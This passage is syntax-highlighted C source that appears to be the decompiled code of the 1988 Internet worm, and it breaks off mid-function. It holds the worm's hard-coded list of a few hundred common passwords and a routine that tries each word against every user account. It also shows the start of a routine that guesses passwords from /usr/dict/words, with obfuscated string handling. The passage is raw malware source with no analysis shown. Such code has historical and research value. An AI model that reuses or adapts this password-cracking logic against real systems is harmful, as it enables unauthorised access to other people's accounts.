    </span><span class="sc6">"fungible"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gabriel"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gardner"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"garfield"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"gauss"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"george"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gertrude"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ginger"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"glacier"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"golfer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gorgeous"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gorges"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"gosling"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gouge"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"graham"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gryphon"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"guest"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"guitar"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gumption"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"guntis"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"hacker"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hamlet"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"handily"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"happening"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"harmony"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"harold"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"harvey"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hebrides"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"heinlein"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hello"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"help"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"herbert"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"hiawatha"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hibernia"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"honey"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"horse"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"horus"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hutchins"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"imbroglio"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"imperial"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"include"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ingres"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"inna"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"innocuous"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"irishman"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"isis"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"japan"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jessica"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"jester"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jixian"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"johnny"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"joseph"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"joshua"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"judith"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"juggle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"julia"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"kathleen"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"kermit"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"kernel"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"kirkland"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"knight"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ladle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lambda"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lamination"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"larkin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"larry"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lazarus"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lebesgue"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"leland"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"leroy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lewis"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"light"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"lisa"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"louis"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lynne"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"macintosh"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"mack"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"maggot"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"magic"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"malcolm"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"mark"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"markus"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"marty"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"marvin"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"master"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"maurice"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mellon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"merlin"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"mets"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"michael"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"michelle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mike"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"minimum"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"minsky"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"moguls"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"moose"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"morley"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mozart"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nancy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"napoleon"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"nepenthe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ness"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"network"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"newton"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"next"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"noxious"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nutrition"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nyquist"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"oceanography"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ocelot"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"olivetti"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"olivia"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"oracle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"orca"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"orwell"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"osiris"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"outlaw"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"oxford"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pacific"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"painless"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pakistan"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"papers"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"password"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"patricia"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"penguin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"peoria"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"percolate"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"persimmon"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"persona"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pete"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"peter"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"philip"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"phoenix"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pierre"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pizza"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"plover"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"plymouth"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"polynomial"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pondering"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pork"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"poster"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"praise"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"precious"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"prelude"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"prince"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"princeton"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"protect"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"protozoa"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pumpkin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"puneet"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"puppet"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rabbit"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"rachmaninoff"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rainbow"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"raindrop"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"raleigh"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"random"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rascal"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"really"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rebecca"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"remote"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rick"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ripple"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"robotics"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"rochester"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rolex"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"romano"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ronald"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"rosebud"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rosemary"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"roses"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ruben"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"rules"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ruth"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"saxon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scamper"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"scheme"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scott"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scotty"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"secret"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"sensor"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"serenity"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sharks"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sharon"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"sheffield"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sheldon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shiva"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shivers"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"shuttle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"signature"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"simon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"simple"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"singer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"single"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smile"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smiles"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"smooch"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smother"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"snatch"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"snoopy"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"soap"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"socrates"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sossina"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sparrows"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"spit"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"spring"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"springer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"squires"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"strangle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"stratford"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"stuttgart"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"subway"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"success"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"summer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"super"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"superstage"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"support"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"supported"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"surfer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"suzanne"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"swearer"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"symmetry"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tangerine"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tape"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"target"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tarragon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"taylor"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"telephone"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"temptation"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"thailand"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tiger"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"toggle"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"tomato"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"topography"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tortoise"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"toyota"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"trails"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"trivial"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"trombone"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tubas"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"tuttle"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"umesh"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"unhappy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"unicorn"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"unknown"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"urchin"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"utility"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vasant"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"vertigo"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vicky"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"village"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"virginia"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"warren"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"water"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"weenie"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"whatnot"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"whiting"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"whitney"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"will"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"william"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"williamsburg"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"willie"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winston"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wisconsin"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"wizard"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wombat"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"woodwind"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wormwood"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"yacov"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"yang"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"yellowstone"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"yosemite"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"zimmerman"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc4">0</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nextw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                  </span><span class="sc1">/* 0x24868 */</span><span class="sc0">

</span><span class="sc1">/* Try a list of potential passwds for each user. */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">try_words</span><span class="sc10">()</span><span class="sc0">              </span><span class="sc1">/* 0x66da */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">cmode</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/* 2724 */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nextw</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">               </span><span class="sc1">/* 2550 */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">permute</span><span class="sc10">(</span><span class="sc11">wds</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;=</span><span class="sc0"> </span><span class="sc4">0x7f</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x27f28</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">     </span><span class="sc1">/* 2664,2718 */</span><span class="sc0">
    </span><span class="sc11">wds</span><span class="sc10">[</span><span class="sc11">nextw</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">|=</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">nextw</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/* Called only from the cracksome() dispatch loop. Tries a single word from th
e
 * dictionary, downcasing if capitalized and trying again. */</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">dict_words</span><span class="sc10">()</span><span class="sc0">             </span><span class="sc1">/* 0x67f0 */</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">usr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">x27f30</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x27f30</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">x27f30</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"/usr/dict/words"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">XS</span><span class="sc10">(</span><span class="sc6">"r"</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x27f30</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">x27f30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc1">/* 2808,2846 */</span><span class="sc0">
    </span><span class="sc11">cmode</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">(&amp;</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">)])[-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x27f28</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">user</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* 2910 */</span><span class="sc0">
    </span><span class="sc11">try_passwd</span><span class="sc10">(</span><span class="sc11">user</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">isupper</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
